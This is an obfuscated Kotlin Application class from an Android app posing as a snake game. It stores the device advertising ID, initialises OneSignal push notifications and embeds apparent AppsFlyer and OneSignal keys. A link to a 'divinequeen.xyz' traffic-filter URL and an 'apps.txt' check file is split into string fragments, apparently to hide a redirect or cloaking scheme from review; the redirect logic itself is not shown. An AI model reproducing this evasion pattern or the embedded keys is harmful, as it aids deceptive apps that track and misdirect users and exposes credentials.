package com.snake.io.slither.w

import android.app.Application
import android.content.Context
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MaaaainClas : Application() {
    companion object {

        var D1efrgt: String? = "d11"
        var efrtgCH: String? = "check"

        const val AF_DEV_KEYdfrgt = "Y9oL3cG3V4Djf9zipjthG"
        const val dfrgthyhyjsoupCheck = "1b4b"


        val linkFilterPart1frgt = "http://divine"
        val frtgtlinkFilterPart2 = "queen.xyz/go.php?to=1&"
        val linkAppsCheckPart1frtgtgyhy = "http://divine"
        val linkAppsCheckPart2fgttyhy = "queen.xyz/apps.txt"

        val odonefrgtgtgt = "sub_id_1="
        const val ONESIGNAL_APP_ID____ = "45fafd6e-7959-4b4c-8012-3e96cb49b69c"


        var MAIN_IDdfrgth: String? = ""
        var C1efgrth: String? = "c11"


    }

    override fun onCreate() {
        super.onCreate()

        GlobalScope.launch(Dispatchers.IO) {
            frgthyapplyDeviceId(context = applicationContext)
        }
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(this)
        OneSignal.setAppId(ONESIGNAL_APP_ID____)
    }

    private suspend fun frgthyapplyDeviceId(context: Context) {
        val rthyyhadvertisingInfo = Advvvvvvvvvvvvvvv(context)
        val idInforfgth = rthyyhadvertisingInfo.dfrgtgetAdvertisingId()

        val prefserfgt = getSharedPreferences("SP", MODE_PRIVATE)
        val dfergtr = prefserfgt.edit()

        dfergtr.putString(MAIN_IDdfrgth, idInforfgth)
        dfergtr.apply()
    }

}

class Advvvvvvvvvvvvvvv(context: Context) {
    private val adInfooooooooooo = AdvertisingIdClient(context.applicationContext)

    suspend fun dfrgtgetAdvertisingId(): String =
        withContext(Dispatchers.IO) {
            adInfooooooooooo.start()
            val adIdInfodfrgtt = adInfooooooooooo.info
            adIdInfodfrgtt.id
        }
}